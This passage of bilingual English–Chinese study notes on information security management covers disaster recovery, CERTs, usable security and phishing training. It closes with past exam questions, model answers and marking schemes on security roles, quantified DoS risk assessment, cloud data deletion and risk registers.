当拖车到达时，插上电源并做必要的检查</p></li><li><p>Plug into the communication lines and do necessary checks. 插入通信线路并做必要的检查</p></li><li><p>Begin loading system from backups. 开始从备份中加载系统</p></li><li><p>Begin normal operations as soon as possible: 尽快开始正常运作</p></li><li><ol><li><p>Daily jobs</p></li><li><ol><li>Job I</li><li>Job 2</li></ol></li><li><p>Daily Saves 每日保存</p></li><li><ol><li>Saving the following data onto…</li></ol></li><li><p>Weekly saves 每周保存</p></li><li><ol><li>Saving the following data onto…</li></ol></li></ol></li></ol><p>Step 4: Plan to transition site back to home-base when it is ready 计划在网站准备好时将其转回母基地</p><ol><li>Plan a schedule to backup the system in order to restore on a home-base computer when a site is available (use regular system backup procedures). 计划一个备份系统的时间表，以便在站点可用时在基地的计算机上进行恢复（使用常规的系统备份程序）</li><li>Secure mobile site and distribute keys as required. 确保移动站点的安全，并根据需要分发钥匙</li><li>Keep a maintenance log on mobile equipment. 保持移动设备的维护记录</li></ol><p>In addition to any business continuity management or disaster recovery plans an organisation has, there are also what are called CERTs.</p><p>CERT</p><p>A Computer Emergency Response Team (CERT) is an expert group that handles computer security incidents.</p><blockquote><p>除了一个组织拥有的任何业务连续性管理或灾难恢复计划外，还有所谓的CERTs</p><p>CERT<br>计算机应急响应小组（CERT）是一个处理计算机安全事件的专家小组</p></blockquote><h3 id="Quiz-2"><a href="#Quiz-2" class="headerlink" title="Quiz"></a>Quiz</h3><h4 id="Q1-2"><a href="#Q1-2" class="headerlink" title="Q1"></a>Q1</h4><p>What is the relationship between business continuity management (BCM) and disaster recovery (DR)?</p><p>Business continuity management includes disaster recovery as a key component. 业务连续性管理包括灾难恢复，是一个关键组成部分</p><p>The correct answer is: BCM includes DR</p><h4 id="Q2-2"><a href="#Q2-2" class="headerlink" title="Q2"></a>Q2</h4><p>The officers of GANT are deciding whether they should put in place robust business continuity management or disaster recovery plans, but they are not quite sure about the difference between them. Explain the difference.</p><blockquote><p>GANT公司的官员们正在决定他们是否应该制定强有力的业务连续性管理或灾难恢复计划，但他们并不十分清楚两者之间的区别。解释一下两者的区别</p></blockquote><p>Disaster recovery is that part of business continuity that addresses the need to recover IT services and voice services and data following a business-threatening impact. Disaster recovery prioritises those services and information that are critical to the business. Disaster recovery includes planning for crisis situations and having in place the means to identify incidents, contain and recover them.</p><blockquote><p>灾难恢复是业务连续性的一部分，它解决了在业务受到威胁后恢复IT服务、语音服务和数据的需要。灾难恢复对那些对业务至关重要的服务和信息进行优先处理。灾难恢复包括对危机情况进行规划，并具备识别事故、控制和恢复事故的手段</p></blockquote><h2 id="Human-Factors-in-Security-and-Usable-Security"><a href="#Human-Factors-in-Security-and-Usable-Security" class="headerlink" title="Human Factors in Security and Usable Security"></a>Human Factors in Security and Usable Security</h2><h3 id="The-usable-security-challenge"><a href="#The-usable-security-challenge" class="headerlink" title="The usable security challenge"></a>The usable security challenge</h3><p>The challenge is to make Information Security more usable and user-centred. 这个挑战就是使信息安全更加可用，并以用户为中心 Here is the definition from the Computing Research Association:</p><p>Give end-users security controls they can understand and privacy they can control for the dynamic, pervasive computing environments of the future.</p><blockquote><p>为终端用户提供他们能够理解的安全控制和他们能够控制的隐私，以应对未来动态的、普遍存在的计算环境</p></blockquote><p>But why is making Information security usable such a challenge? The difficulty mainly starts with a misalignment in goals. The security experts want to avoid security issues, while users want a great user experience.</p><blockquote><p>但是，为什么使信息安全变得可用是一个挑战？困难主要是从目标的错位开始的。安全专家希望避免安全问题，而用户则希望有良好的用户体验</p></blockquote><p>That is to say, under normal conditions users don’t see security as a priority. They have goals and objectives they want to achieve and consider security as a <strong>secondary task</strong> only.</p><blockquote><p>也就是说，在正常情况下，用户并不把安全视为优先事项。他们有自己想要实现的目标和目的，而把安全视为次要的任务而已</p></blockquote><p>Some experts have gone as far as stating that users do not want to be responsible for, nor concern themselves with, their own security.</p><blockquote><p>一些专家甚至指出用户不希望对自己的安全负责，也不关心自己的安全问题</p></blockquote><p>There is nothing to be achieved by simply blaming users for not considering security enough. What can we as experts do to help them?</p><blockquote><p>仅仅指责用户没有充分考虑安全问题，是没有任何结果的。作为专家，我们能做些什么来帮助他们？</p></blockquote><p>Human Factors in Security</p><ul><li>Security is often a secondary task for users </li><li>We need to give users security controls that they can understand and use </li><li>Overly complex or opaque controls will likely be ignored or circumvented </li><li>People construct their own mental models of security threats and controls </li><li>This is not the user’s fault, and punishing people for not following complicated procedures is unlikely to foster change</li></ul><blockquote><ul><li>安全往往是用户的次要任务 </li><li>我们需要给用户提供他们能够理解和使用的安全控制。</li><li>过于复杂或不透明的控制可能会被忽视或规避 </li><li>人们构建自己的安全威胁和控制的心理模型 </li><li>这不是用户的错，惩罚不遵守复杂程序的人不太可能促进改变</li></ul></blockquote><h3 id="Usable-security-issues"><a href="#Usable-security-issues" class="headerlink" title="Usable security issues"></a>Usable security issues</h3><p>Unusable security frustrates users.</p><blockquote><p>无法使用的安全（我理解为可用性差或者对使用造成不便的安全）会让用户感到沮丧</p></blockquote><p>Indeed, not only does it create frustration, but users will also then work around the mechanism in any way they can to avoid that frustration.</p><blockquote><p>事实上，它不仅会产生挫折感，而且用户随后也会以任何方式绕过该机制来避免这种挫折感</p></blockquote><h4 id="Encryption-usability"><a href="#Encryption-usability" class="headerlink" title="Encryption usability"></a>Encryption usability</h4><p>The vital security control of encrypting communications to achieve confidentiality offers us yet another example of lack of usability.</p><blockquote><p>对通信进行加密以实现保密性的重要安全控制为我们提供了另一个缺乏可用性的例子</p></blockquote><p>Firstly, encryption is rarely configured by default. Secondly, you need a good password which cannot be lost or forgotten. For public-/private-key encryption, it is often not clear how to get someone’s public key, or how to make it work on a phone, for example. Additionally, there is perhaps a common view that ‘only paranoid people use encryption’.</p><blockquote><p>首先，加密很少被默认配置。其次，你需要一个好的密码，不能丢失或忘记。对于公钥/私钥加密，通常不清楚如何获得某人的公钥，或者如何使其在手机上工作，例如。此外，也许有一种普遍的观点认为 “只有偏执狂才会使用加密”</p></blockquote><p>Let’s consider a real example of the implications of ‘unusable encryption’: the case of Edward Snowden. As part of his attempts to make public sensitive information about the US government’s infringements on privacy while needing to maintain his own secrecy, he attempted to securely contact a journalist, Glenn Greenwald:</p><p>Snowden wanted to send a message to Greenwald but worried that others might want to intercept his messages. He asked Greenwald for his PGP key.</p><p>But Greenwald still refused to study security protocols, saying ‘the more he sent me, the more difficult it seemed,’ he says. ‘I mean, now I had to watch a f***ing video . . . ?’</p><p>Snowden ended up reaching out to a different journalist, Laura Poitras, instead.</p><blockquote><p>让我们考虑一个关于 “无法使用的加密”的影响的真实例子：爱德华-斯诺登的案例。作为他试图公开美国政府侵犯隐私的敏感信息的一部分，同时需要保持自己的秘密，他试图安全地联系一位记者Glenn Greenwald</p><p>斯诺登想给格林沃尔德发信息，但担心其他人可能想截获他的信息。他向格林沃尔德要了他的PGP密钥</p><p>但格林沃尔德仍然拒绝研究安全协议，他说’他给我发的东西越多，看起来就越困难’。’我的意思是，现在我不得不看一个该死的视频. . . ?’</p><p>斯诺登最后转而联系了另一位记者劳拉-波依特拉斯</p></blockquote><p>Vulnerability to Social Engineering </p><ul><li>Human nature of trust, social compliance. </li><li>Greed, pride, fear. </li><li>Lack of education / ignorance. </li><li>Lack of / weak security policies. </li><li>Access control / least privileges.</li></ul><blockquote><p>社会工程的弱点 </p><ul><li>人性的信任，社会的服从。</li><li>贪婪，骄傲，恐惧。</li><li>缺乏教育/无知。</li><li>缺少/薄弱的安全政策。</li><li>访问控制/最小特权.</li></ul></blockquote><h3 id="How-can-we-make-secure-systems-more-usable"><a href="#How-can-we-make-secure-systems-more-usable" class="headerlink" title="How can we make secure systems more usable?"></a>How can we make secure systems more usable?</h3><p>Fortunately, usable security is being considered more and more by companies. It has even started to be used as a powerful marketing tool. Recall the case of unusable security notifications in Windows, which made it very easy for Apple to produce adverts attacking their competitor for this very point.</p><blockquote><p>幸运的是，可使用的安全性正被越来越多的公司所考虑。它甚至已经开始被用作一个强大的营销工具。回顾一下Windows中不可用的安全通知的案例，这使得苹果公司很容易制作广告来攻击他们的竞争对手，因为这一点</p></blockquote><p>There are three main approaches to making secure systems more usable discussed in the literature. There is no silver bullet and often we rely on a combination of them: 在文献中，有三种主要的方法来使安全系统更加可用。没有灵丹妙药，我们经常依靠它们的组合</p><h4 id="Make-security-‘just-work’"><a href="#Make-security-‘just-work’" class="headerlink" title="Make security ‘just work’"></a>Make security ‘just work’</h4><p>Technical measures that can remove effort from security processes 可以从安全过程中消除影响的技术措施</p><ul><li>Automated filtering of links and email senders (SPF/DMARC/etc.) </li><li>Entering a password vs a password manager or FaceID </li><li>Automated fingerprinting (e.g. some CAPTCHAs)</li></ul><blockquote><ul><li>自动过滤链接和电子邮件发送者（SPF/DMARC/等）。</li><li>输入密码与密码管理器或FaceID对比</li><li>自动指纹识别（例如一些验证码）</li></ul></blockquote><p>This is the idea that security systems should be <strong>invisible</strong> to the user. Examples include mechanisms that authenticate users without demanding much intervention from them, in a move from explicit to <strong>implicit authentication mechanisms</strong>:</p><ul><li>proximity sensors</li><li>behavioural biometrics: zero-effort, one-step, two-factor authentication</li><li>exploiting interaction style: use of video-based authentication in video, audio in audio, etc</li><li>web fingerprinting.</li></ul><blockquote><p>这是一种想法，即安全系统对用户来说应该是不可见的。这方面的例子包括在从显性认证机制到隐性认证机制的过程中，在不要求用户过多干预的情况下对用户进行认证的机制</p><p>接近传感器<br>行为生物识别技术：零努力，一步到位，双因素认证<br>利用交互方式：在视频中使用基于视频的认证，在音频中使用音频，等等<br>网络指纹识别</p></blockquote><h4 id="Make-security-understandable"><a href="#Make-security-understandable" class="headerlink" title="Make security understandable"></a>Make security understandable</h4><p>Of course, there may be cases where security needs to be visible, such as when the user needs to make some kind of decision – eg whether a website is trustworthy. In that case, we need to help users <strong>understand</strong> security. A good example, for instance, is the connection security indicators present in most modern browsers, which can communicate to the user whether the HTTP connection is secure.</p><blockquote><p>当然，在有些情况下，安全需要是可见的，例如当用户需要做出某种决定时–例如一个网站是否值得信赖。在这种情况下，我们需要帮助用户理解安全。例如，一个很好的例子是大多数现代浏览器中的连接安全指标，它可以向用户传达HTTP连接是否安全</p></blockquote><p>Note, however, that correct understanding is crucial since the mere fact of a site using HTTPS does not mean that everything is suddenly secure. There are plenty of things that could still go wrong with a website that uses HTTPS to communicate with the user, which can be found in the list below.</p><blockquote><p>然而，请注意，正确的理解是至关重要的，因为仅仅是一个网站使用HTTPS的事实并不意味着一切突然变得安全。使用HTTPS与用户通信的网站仍有很多事情可能出错，可以在下面的列表中找到</p></blockquote><p>What can still go wrong on a secure connection?</p><ul><li>there is malware on the site</li><li>there may already be a keylogger on the user’s computer</li><li>malicious third-party ads or trackers may be present</li><li>the site may not be the site that the user thinks it is – perhaps the certificate is valid but not for the company you are expecting (phishing)</li><li>the certificate authority was compromised and issued an invalid certificate.</li></ul><blockquote><p>网站上有恶意软件<br>用户的电脑上可能已经有了键盘记录器<br>可能存在恶意的第三方广告或跟踪器<br>该网站可能不是用户认为的网站–也许证书是有效的，但不是你所期望的公司（网络钓鱼）<br>证书颁发机构受到影响，并颁发了一个无效的证书</p></blockquote><p>Beyond understandability, users’ decisions need to be supported. Crucially, users should only be bothered when their input is required. For instance, if one can automatically assess the probability of danger, the user may only need to intervene in the cases that are not clear, which instantly minimises required user intervention (and avoids the constantly annoying warnings in the Microsoft-Apple advert, for instance).</p><blockquote><p>除了可理解性，用户的决定也需要得到支持。最重要的是，只有在需要用户投入的时候才应该打扰他们。例如，如果可以自动评估危险的概率，用户可能只需要在不清楚的情况下进行干预，这就立即将需要的用户干预降到了最低（例如，避免了微软-苹果广告中不断出现的烦人的警告）</p></blockquote><p>A good rule of thumb: 一个好的经验法则</p><table><thead><tr><th align="left">High probability of danger</th><th>Block automatically 自动屏蔽</th></tr></thead><tbody><tr><td align="left">Moderate possibility of danger</td><td>User must decide</td></tr><tr><td align="left">Very little possibility of danger</td><td>Allow without bothering the user</td></tr></tbody></table><h4 id="Train-the-user"><a href="#Train-the-user" class="headerlink" title="Train the user"></a>Train the user</h4><p>Training and awareness is important in helping people understand why measures are needed and how they help manage security </p><ul><li>Tell people about existing threats and how they were stopped </li><li>Tell people why certain processes need more protection than others</li></ul><blockquote><p>培训和宣传对于帮助人们理解为什么需要采取措施以及这些措施如何帮助管理安全非常重要 </p><ul><li>告诉人们现有的威胁以及如何阻止这些威胁的发生 </li><li>告诉人们为什么某些程序比其他程序需要更多的保护</li></ul></blockquote><p>Beyond the controls themselves, which can be made more usable as explained above, we can also train the user. Let’s consider how this might work in the case of <strong>phishing</strong>.</p><blockquote><p>除了控制本身（如上文所述，可以使其更加可用），我们还可以培训用户。让我们考虑一下这在网络钓鱼的情况下如何运作</p></blockquote><p>What are the different reasons why users may fall for phishing?</p><ul><li>They are <strong>not motivated</strong> to pay attention to training: ‘security is not my problem’.</li><li>Their <strong>mental models are inconsistent with reality</strong>: ‘if the site looks professional it must be legitimate’.</li><li>It is difficult to be alert if you don’t know what you’re looking for: users need actionable advice that they can understand.</li></ul><blockquote><p>他们没有动力去关注培训：”安全不是我的问题”<br>他们的心智模式与现实不一致：’如果网站看起来很专业，就一定是合法的’<br>如果你不知道自己在寻找什么，就很难提高警惕：用户需要他们能够理解的可操作建议</p></blockquote><p>The PhishGuru training experiment shows how it is possible to train people to distinguish between phishing and legitimate emails:</p><ul><li>those trained with PhishGuru still clicked on <strong>legitimate</strong> links</li><li>but those trained with PhishGuru were <strong>less likely</strong> to click on phishing links, even 28 days after training.</li></ul><blockquote><p>《网络钓鱼大师》培训实验表明，训练人们区分网络钓鱼和合法邮件是可行的</p><p>接受过《网络钓鱼大师》培训的人仍然会点击合法链接<br>但接受过《网络钓鱼大师》培训的人更不可能点击钓鱼网站的链接，即使在培训28天后也是如此</p></blockquote><blockquote><p>Security versus usability is a myth! You need both security and usability to go hand-in-hand.</p><p>安全性与可用性的关系是一个神话! 你需要安全和可用性并驾齐驱</p></blockquote><h3 id="Quiz-3"><a href="#Quiz-3" class="headerlink" title="Quiz"></a>Quiz</h3><p>There is always a trade-off between usability and security. 在可用性和安全性之间总是需要权衡</p><p>The correct answer is: False</p><p>You can’t say always. It should be sometimes.</p><h2 id="Past-Exam-Paper-2020-8"><a href="#Past-Exam-Paper-2020-8" class="headerlink" title="Past Exam Paper 2020/8"></a>Past Exam Paper 2020/8</h2><h3 id="Question-One"><a href="#Question-One" class="headerlink" title="Question One"></a>Question One</h3><p>The Group of Appreciation of the Natterjack Toad (GANT) is a conservation group that is keen to promote and preserve the well-being of the Natterjack Toad. It is a UK-registered charity and has a significant number of over 100,000 members world-wide across 42 countries who are all keen to promote the work of GANT, and 100 staff working full-time at GANT. All information for the organisation can be accessed using a web-based application. This information includes GANT’s member records, its activities, meeting places, confidential aspects of their work, natterjack toad habitats, etc. In the past, members have raised concerns about information security, and to prevent further cyberattacks, GANT is ready to make information security a top priority amongst its workforce.</p><blockquote><p>Natterjack Toad欣赏小组（GANT）是一个热衷于促进和保护Nutterjack Toad福祉的保护小组。它是一个在英国注册的慈善机构，在全世界42个国家拥有超过10万名成员，他们都热衷于促进GANT的工作，还有100名工作人员在GANT全职工作。该组织的所有信息都可以通过一个基于网络的应用程序访问。这些信息包括GANT的成员记录、其活动、会议地点、其工作的保密性、黄斑蟾的栖息地等。在过去，成员们提出了对信息安全的担忧，为了防止进一步的网络攻击，GANT准备将信息安全作为其员工队伍中的首要任务</p></blockquote><h4 id="a-Describe-the-Security-Roles-and-Teams-you-would-suggest-GANT-to-have-and-explain-why"><a href="#a-Describe-the-Security-Roles-and-Teams-you-would-suggest-GANT-to-have-and-explain-why" class="headerlink" title="a. Describe the Security Roles and Teams you would suggest GANT to have and explain why"></a>a. Describe the Security Roles and Teams you would suggest GANT to have and explain why</h4><p>描述你建议GANT拥有的安全角色和团队，并解释原因</p><p>Given the size of GANT, it would probably make sense to have a CISO, or alternatively somebody that could partially play the role of a CISO at the board level. A director or board member has the necessary status to ensure appropriate focus is placed on information security, and also the adequate level of accountability/responsibility as required by legislation such as The Companies Act (UK). Also, this will demonstrate from the “higher-ups” a real commitment to information security in GANT. </p><blockquote><p>考虑到GANT公司的规模，设立一个CISO，或者由某个人在董事会层面部分扮演CISO的角色，可能是有意义的。董事或董事会成员具有必要的地位，可以确保对信息安全给予适当的关注，也可以按照《公司法》（英国）等法律的要求，承担足够的责任/义务。此外，这将表明 “高层 “对GANT信息安全的真正承诺</p></blockquote><p>While the CISO is very important, one person can’t do everything. The CISO, or alternative role at the board level, should work together with a Security Forum of people playing a different role in the organisation contributing to information security from their day-to-day job. This may include: departmental headers; and representatives from vested interest parties (i.e. IT, internal audit, HR, physical security). </p><blockquote><p>虽然CISO非常重要，但一个人不可能做所有的事情。CISO，或董事会层面的替代角色，应该与安全论坛一起工作，该论坛由在组织中扮演不同角色的人组成，在日常工作中为信息安全做出贡献。这可能包括：部门领导；以及来自既得利益方的代表（即IT、内部审计、人力资源、物理安全）</p></blockquote><p>The team should also include specific security roles, such as:</p><p>Security Administrator. A person who manages the operation of a computer system or particular electronic communication service. </p><p>Security Auditor. A person who works with a company to provide an audit of security systems used by that company. </p><p>Security User. A person who interacts with a system, typically through an interface, to extract some functional benefit. </p><p>Incident Response Member. A person who interacts with a system, typically through an interface, to extract some functional benefit. </p><p>Security Champion. A person who is appointed to oversee that a security policy within their group is enforced and to report incidents to management. </p><p>Security Officer. A person employed by the organisation to protect the assets from a variety of hazards by enforcing preventative measures. </p><p>This is not an exhaustive list of possible roles. </p><blockquote><p>Marking scheme </p><p>Up to 8 marks for the CISO and its explanation, 4 marks for the Security Forum, up to 4 marks for each role, and up to 4 marks for an explanation of the role. </p><p>CISO及其解释最多8分，安全论坛最多4分，每个角色最多4分，对角色的解释最多4分</p></blockquote><blockquote><p>安全管理员。管理计算机系统或特定电子通信服务运行的人。</p><p>安全审计员。与一家公司合作，对该公司使用的安全系统进行审计的人。</p><p>安全用户。一个与系统互动的人，通常是通过一个接口，以提取一些功能的好处。</p><p>事件响应成员。一个与系统互动的人，通常通过一个接口，以获得一些功能上的好处。</p><p>安全冠军。被任命监督其集团内安全政策的执行，并向管理层报告事件的人。</p><p>安全官员。由组织雇用的人员，通过执行预防措施保护资产免受各种危害。</p><p>这并不是一份可能的角色的详尽清单</p></blockquote><h4 id="b-What-threats-and-vulnerabilities-may-GANT-face"><a href="#b-What-threats-and-vulnerabilities-may-GANT-face" class="headerlink" title="b. What threats and vulnerabilities may GANT face?"></a>b. What threats and vulnerabilities may GANT face?</h4><p>A threat highlights a problem that if it arises will result in adverse consequences. This may include 1) Information about members might be accessible by unauthorised people. 2) Information about the habitats of the Natterjack toad might be used by those who are not inclined to support its ongoing existence. 3) The website might be compromised, and unofficial messages added to it.</p><p>A vulnerability is a weakness in the system that might allow the threat to happen. This may include 1) Records of members are stored in an unreliable computer system that may crash in the future. 2) Information about the toad’s habitats may be stored on an old Internet-based and insecure server. 3) The administrator password for the website has never been changed from the default password. </p><blockquote><p> Marking scheme </p><p>5 marks per threat/vulnerability</p></blockquote><blockquote><p>威胁强调了一个问题，如果它出现将导致不良后果。这可能包括：1）关于成员的信息可能被未经授权的人获取。2）关于Natterjack蟾蜍的栖息地的信息可能被那些不愿意支持其持续存在的人使用。3）网站可能被破坏，并被加入非官方的信息</p><p>漏洞是系统中可能允许威胁发生的一个弱点。这可能包括：1）成员的记录存储在一个不可靠的计算机系统中，将来可能会崩溃。2）关于蟾蜍的栖息地的信息可能储存在一个基于互联网的不安全的旧服务器上。3）网站的管理员密码从未从默认密码中更改</p></blockquote><h3 id="Question-Two"><a href="#Question-Two" class="headerlink" title="Question Two"></a>Question Two</h3><p>SEM Ltd. is a company that operates an online service 24/7 all days of the year serving 10,000 customers all over the world. SEM Ltd. suffered 90 Denial of Service (DoS) attacks since they started operating 3 years ago. Every time this attack happens, it causes losses of £1 per customer, as their services are not available to their customers until SEM Ltd.’s IT team manage to relaunch the online platform. An off-the-shelf DoS mitigation appliance costs £300,000 per year, and SEM is more concerned about the company’s finance status than on customer confidence.</p><blockquote><p>SEM有限公司是一家全年24小时运营在线服务的公司，为世界各地的10,000名客户提供服务。SEM有限公司自3年前开始运营以来，遭受了90次拒绝服务（DoS）攻击。每次这种攻击发生时，都会给每个客户造成1英镑的损失，因为他们的服务无法提供给客户，直到SEM有限公司的IT团队设法重新启动在线平台。一个现成的DoS缓解设备每年要花费30万英镑，而SEM更关心的是公司的财务状况而不是客户的信心</p></blockquote><h4 id="a"><a href="#a" class="headerlink" title="a"></a>a</h4><p>Conduct a quantified assessment, including a clear description of the metrics used, of the risk SEM Ltd. faces, and decide the most adequate risk treatment, clearly identifying both the name of the risk treatment action and its rationale.</p><blockquote><p>对SEM有限公司所面临的风险进行量化评估，包括对所使用的衡量标准的明确描述，并决定最适当的风险处理方法，明确指出风险处理行动的名称和其理由</p></blockquote><p>The Annualized Rate of Occurrence (ARO) is a business-friendly measure of the probability of occurrence of an event that measures how likely an event is to happen during a year. For this risk the ARO is 90/3 = 30 attacks/year.</p><p>The Annual Loss Expectancy (ALE) is a business-friendly measure of a risk in a quantitative risk assessment approach. It is calculated based on the annual rate of occurrence (ARO) and the single loss expectancy (SLE) for each risk. For this risk, the ARO is as above and the SLE is £10,000 (10,000 customers at £1 each per attack). Therefore, ALE = ARO×SLE = 30×10, 000 = £300,000.</p><p>Given that the ALE for this risk is £300,000 and the off-the-shelf DoS mitigation appliance costs £300,000, the most reasonable risk treatment type is accept the risk, as it will be costing the company the same. However, this is open to interpretation and one could think that other risk treatment options are possible. Alternative answers should be fine as long as the name of the particular risk treatment type suggested is correct, and there is a well-explained rationale to support it.</p><blockquote><p>Marking scheme </p><p>5 marks for ARO (2 marks if they describe it well, 3 if they are able to calculate it correctly for this particular case); 3 marks for SLE; 10 marks for ALE (5 marks if they describe it well, 5 if they are able to calculate it correctly for this particular case); 12 marks per adequate risk treatment (4 marks for the risk treatment type; 8 marks depending on the detail and correctness of the rationale given for explaining the treatment).</p><p>ARO得5分（如果描述得好得2分，如果能够针对这个特定案例正确计算得3分）；SLE得3分；ALE得10分（如果描述得好得5分，如果能够针对这个特定案例正确计算得5分）；每个适当的风险处理得12分（风险处理类型得4分；8分取决于解释处理的理由的细节和正确性）</p></blockquote><blockquote><p>年发生率（ARO）是对事件发生概率的一种商业友好的衡量标准，衡量一个事件在一年内发生的可能性。对于这种风险，ARO是90/3=30次攻击/年</p><p>年度损失预期（ALE）是定量风险评估方法中对风险的一种商业友好的衡量标准。它是根据每个风险的年度发生率（ARO）和单一损失预期（SLE）来计算的。对于这个风险，ARO如上，SLE为10,000英镑（10,000个客户，每次攻击1英镑）。因此，ALE = ARO×SLE = 30×10，000 = 300，000英镑</p><p>鉴于这种风险的ALE是300,000英镑，而现成的DoS缓解设备成本为300,000英镑，最合理的风险处理类型是接受风险，因为它将给公司带来相同的成本。然而，这是可以解释的，人们可以认为其他的风险处理方案是可能的。只要建议的特定风险处理类型的名称是正确的，并有充分解释的理由来支持它，其他答案应该是可以的</p></blockquote><h4 id="b"><a href="#b" class="headerlink" title="b"></a>b</h4><p>As an alternative to the off-the-shelf DoS mitigation appliance, SEM Ltd. are also exploring cloud computing, so that they could elastically expand the instances of their service as a way of replicating it and becoming less vulnerable to DoS. However, SEM Ltd. are worried about whether they will be able to completely remove data from the cloud when needed. What are the main challenges that make it difficult for SEM Ltd. to delete data from the cloud?</p><blockquote><p>作为现成的DoS缓解设备的替代方案，SEM有限公司也在探索云计算，这样他们就可以弹性地扩展他们的服务实例，作为一种复制的方式，从而减少对DoS的伤害。然而，SEM有限公司担心他们是否能够在需要时从云中完全删除数据。使得SEM有限公司难以从云中删除数据的主要挑战是什么？</p></blockquote><p>The student should thoroughly explain and expand on the following points: Multiple copies of data; Virtualization; Multiple users (Data gets tangled together); Multiple components; Multiple logical layers; Underlying hardware (E.g., Different storage media - SSDs); Third-party and Offline backups (- e.g., other services / tapes).</p><blockquote><p>Marking scheme </p><p>20 marks per depth and rationale of explanation.</p><p>每个解释的深度和理由得20分</p></blockquote><blockquote><p>学生应该彻底解释并扩展以下几点。</p><p>数据的多个副本；</p><p>虚拟化；</p><p>多个用户（数据被纠缠在一起）；</p><p>多个组件；</p><p>多个逻辑层；</p><p>基础硬件（例如，不同的存储介质 - SSD）；</p><p>第三方和离线备份（- 例如，其他服务/磁带）</p></blockquote><h2 id="Past-Exam-Paper-2020-1"><a href="#Past-Exam-Paper-2020-1" class="headerlink" title="Past Exam Paper 2020/1"></a>Past Exam Paper 2020/1</h2><h3 id="Question-One-1"><a href="#Question-One-1" class="headerlink" title="Question One"></a>Question One</h3><h4 id="a-What-should-risk-registers-contain-as-a-minimum-for-each-risk"><a href="#a-What-should-risk-registers-contain-as-a-minimum-for-each-risk" class="headerlink" title="a. What should risk registers contain as a minimum for each risk?"></a>a. What should risk registers contain as a minimum for each risk?</h4><p>Syllabus: Risk Management. </p><ul><li>the threats and the vulnerabilities they might exploit </li><li>the assessed impact and likelihood, and the overall risk calculated from these </li><li>the recommended treatment (accept, avoid, reduce, transfer) </li><li>the actual action(s) to be taken and the person or department responsible for carrying out this work and the date by which it is expected to be completed. </li></ul><blockquote><p>Marking scheme </p><p>1 mark per point </p></blockquote><blockquote><ul><li>威胁和它们可能利用的弱点 </li><li>评估的影响和可能性，以及根据这些计算出的总体风险 </li><li>建议的处理方法（接受、避免、减少、转移）</li><li>要采取的实际行动，负责执行这项工作的人或部门以及预计完成的日期</li></ul></blockquote><h4 id="b-What-is-an-evasion-attack-in-the-context-of-risks-stemming-from-the-use-of-Machine-Learning"><a href="#b-What-is-an-evasion-attack-in-the-context-of-risks-stemming-from-the-use-of-Machine-Learning" class="headerlink" title="b. What is an evasion attack in the context of risks stemming from the use of Machine Learning?"></a>b. What is an evasion attack in the context of risks stemming from the use of Machine Learning?</h4><p>Syllabus: Risk Assessments </p><p>Evasion attacks on a machine learning model, are those attacks where malicious objects are deliberately transformed to make the machine learning model make wrong predictions. For instance, a software binary can be manipulated to make a machine-learning based anti-malware model predict that it is not malware. </p><blockquote><p>Marking scheme </p><p>2 marks per definition; 2 marks for example.</p></blockquote><blockquote><p>对机器学习模型的规避攻击，是指那些故意改造恶意对象以使机器学习模型做出错误预测的攻击。例如，一个软件的二进制文件可以被操纵，使基于机器学习的反恶意软件模型预测它不是恶意软件</p></blockquote><h4 id="c-Name-4-generic-types-of-assurance-techniques-that-can-be-used-for-vulnerability-assessments"><a href="#c-Name-4-generic-types-of-assurance-techniques-that-can-be-used-for-vulnerability-assessments" class="headerlink" title="c. Name 4 generic types of assurance techniques that can be used for vulnerability assessments."></a>c. Name 4 generic types of assurance techniques that can be used for vulnerability assessments.</h4><p>Syllabus: Vulnerability Assessment. </p><p>Any of the following techniques will be accepted at least: Review, Test, Interview, Observe, and Independent Validation. Note that the question does not ask for particular assurance techniques like penetration testing, but the generic type they belong to, in this case testing. </p><blockquote><p>Marking scheme </p><p>1 mark per correct generic type of assurance technique named</p></blockquote><blockquote><p>至少要接受以下任何一种技术。审查、测试、访谈、观察和独立验证。请注意，该问题并不要求特定的保证技术，如渗透测试，而是要求它们所属的通用类型，在这种情况下就是测试</p></blockquote><h4 id="d-Can-an-organisation-self-determine-whether-it-is-following-an-information-security-standard-Justify-your-answer"><a href="#d-Can-an-organisation-self-determine-whether-it-is-following-an-information-security-standard-Justify-your-answer" class="headerlink" title="d. Can an organisation self-determine whether it is following an information security standard? Justify your answer."></a>d. Can an organisation self-determine whether it is following an information security standard? Justify your answer.</h4><p>Syllabus: Compliance and Certifications. </p><p>Of course it can. An organisation can conduct an internal compliance check against any standard. Compliance would only need to be checked by an independent (external) party for certification purposes. </p><blockquote><p>Marking scheme </p><p>1 mark for answer; 3 marks for explanation.</p></blockquote><blockquote><p>当然可以。一个组织可以根据任何标准进行内部合规性检查。合规性只需要由一个独立的（外部）方来检查，以达到认证的目的</p></blockquote><h4 id="e-What-is-a-Moral-Hazard-and-how-does-it-apply-to-Information-Security-Give-one-example"><a href="#e-What-is-a-Moral-Hazard-and-how-does-it-apply-to-Information-Security-Give-one-example" class="headerlink" title="e. What is a Moral Hazard and how does it apply to Information Security? Give one example."></a>e. What is a Moral Hazard and how does it apply to Information Security? Give one example.</h4><p>Syllabus: Security Economics. </p><p>A Moral hazard is a situation in which one party gets involved in a risky event knowing that it is protected against the risk. For instance, one may engage with riskier and less secure websites thinking that the anti-malware they have installed will protect them. </p><blockquote><p>Marking scheme </p><p>2 marks for definition; 2 marks for example. </p></blockquote><blockquote><p>道德风险是一种情况，即一方在明知自己受到保护的情况下参与到风险事件中。例如，一个人可能会参与风险较大、安全性较低的网站，认为他们所安装的反恶意软件会保护他们</p></blockquote><h4 id="f-What-does-it-mean-for-a-security-control-to-be-preventative-detective-and-reactionary"><a href="#f-What-does-it-mean-for-a-security-control-to-be-preventative-detective-and-reactionary" class="headerlink" title="f. What does it mean for a security control to be preventative, detective and reactionary?"></a>f. What does it mean for a security control to be preventative, detective and reactionary?</h4><p>Syllabus: Security controls </p><p>Preventative security attempts to stop an exploit from being exploited. Detective security tries to discover if an attack is underway. Reactionary tries to respond to an attack and reduce its impact. </p><blockquote><p>Marking scheme </p><p>1 mark for each individual definition, 1 mark for overall quality of explanation.</p></blockquote><blockquote><p>预防性安全试图阻止一个漏洞被利用。侦查性安全试图发现一个攻击是否正在进行中。反应性安全试图对攻击作出反应并减少其影响</p></blockquote><h4 id="g-What-are-procedural-controls-Give-one-example-regarding-information-security"><a href="#g-What-are-procedural-controls-Give-one-example-regarding-information-security" class="headerlink" title="g. What are procedural controls? Give one example regarding information security."></a>g. What are procedural controls? Give one example regarding information security.</h4><p>Syllabus: Security Controls. 